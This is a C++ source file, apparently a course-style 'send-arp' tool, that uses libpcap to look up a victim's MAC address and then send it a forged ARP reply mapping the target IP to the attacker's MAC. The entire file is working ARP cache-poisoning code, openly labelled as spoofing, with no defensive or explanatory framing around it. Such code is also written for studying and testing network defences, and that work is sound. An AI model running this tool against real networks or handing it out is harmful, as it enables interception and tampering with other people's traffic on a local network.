#include <pcap.h>
#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <fstream>
#include <iostream>
#include <regex>
#include <string>
#include <arpa/inet.h>
#include <unistd.h>

#define MAC_LEN 6
#define IP_LEN 4

#pragma pack(push, 1)
struct eth_hdr_t {
	uint8_t dmac[MAC_LEN];
	uint8_t smac[MAC_LEN];
	uint16_t type;
};

struct arp_hdr_t {
	uint16_t hrd;
	uint16_t pro;
	uint8_t hln;
	uint8_t pln;
	uint16_t op;
	uint8_t smac[MAC_LEN];
	uint8_t sip[IP_LEN];
	uint8_t tmac[MAC_LEN];
	uint8_t tip[IP_LEN];
};
#pragma pack(pop)

void usage() {
	printf("syntax : send-arp <interface> <sender ip> <target ip>\n");
	exit(1);
}

bool get_mac(const std::string& iface, uint8_t* mac) {
	std::ifstream f("/sys/class/net/" + iface + "/address");
	if (!f.is_open()) return false;

	std::string line;
	std::getline(f, line);
	line.erase(std::remove(line.begin(), line.end(), ':'), line.end());

	if (line.length() != 12) return false;

	for (int i = 0; i < MAC_LEN; ++i) {
		mac[i] = std::stoi(line.substr(i * 2, 2), nullptr, 16);
	}
	return true;
}

int main(int argc, char* argv[]) {
	if (argc != 4) usage();

	char* dev = argv[1];
	const char* sender_ip = argv[2];
	const char* target_ip = argv[3];

	uint8_t attacker_mac[MAC_LEN];
	if (!get_mac(dev, attacker_mac)) {
		std::cerr << "Failed to get MAC address for interface: " << dev << "\n";
		return 1;
	}

	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
	if (!handle) {
		std::cerr << "pcap_open_live() failed: " << errbuf << "\n";
		return 1;
	}

	uint8_t req[42] = {0};
	auto* eth = (eth_hdr_t*)req;
	auto* arp = (arp_hdr_t*)(req + sizeof(eth_hdr_t));

	memset(eth->dmac, 0xff, MAC_LEN); // broadcast
	memcpy(eth->smac, attacker_mac, MAC_LEN);
	eth->type = htons(0x0806);

	arp->hrd = htons(1);
	arp->pro = htons(0x0800);
	arp->hln = MAC_LEN;
	arp->pln = IP_LEN;
	arp->op  = htons(1); // ARP Request
	memcpy(arp->smac, attacker_mac, MAC_LEN);
	inet_pton(AF_INET, target_ip, arp->sip);
	memset(arp->tmac, 0x00, MAC_LEN);
	inet_pton(AF_INET, sender_ip, arp->tip);

	if (pcap_sendpacket(handle, req, sizeof(req)) != 0) {
		std::cerr << "Failed to send ARP request\n";
		return 1;
	}

	uint8_t sender_mac[MAC_LEN];
	struct pcap_pkthdr* header;
	const u_char* pkt;

	while (true) {
		int res = pcap_next_ex(handle, &header, &pkt);
		if (res != 1) continue;

		auto* r_eth = (eth_hdr_t*)pkt;
		auto* r_arp = (arp_hdr_t*)(pkt + sizeof(eth_hdr_t));

		if (ntohs(r_eth->type) == 0x0806 &&
			ntohs(r_arp->op) == 2 &&
			memcmp(r_arp->sip, arp->tip, IP_LEN) == 0) {
			memcpy(sender_mac, r_arp->smac, MAC_LEN);
		break;
			}
	}

	uint8_t spoof[42] = {0};
	eth = (eth_hdr_t*)spoof;
	arp = (arp_hdr_t*)(spoof + sizeof(eth_hdr_t));

	memcpy(eth->dmac, sender_mac, MAC_LEN);
	memcpy(eth->smac, attacker_mac, MAC_LEN);
	eth->type = htons(0x0806);

	arp->hrd = htons(1);
	arp->pro = htons(0x0800);
	arp->hln = MAC_LEN;
	arp->pln = IP_LEN;
	arp->op  = htons(2); // ARP Reply
	memcpy(arp->smac, attacker_mac, MAC_LEN);
	inet_pton(AF_INET, target_ip, arp->sip);
	memcpy(arp->tmac, sender_mac, MAC_LEN);
	inet_pton(AF_INET, sender_ip, arp->tip);

	if (pcap_sendpacket(handle, spoof, sizeof(spoof)) != 0) {
		std::cerr << "Failed to send ARP reply\n";
		return 1;
	}

	std::cout << "ARP spoofing packet sent to " << sender_ip << "\n";

	pcap_close(handle);
	return 0;
}
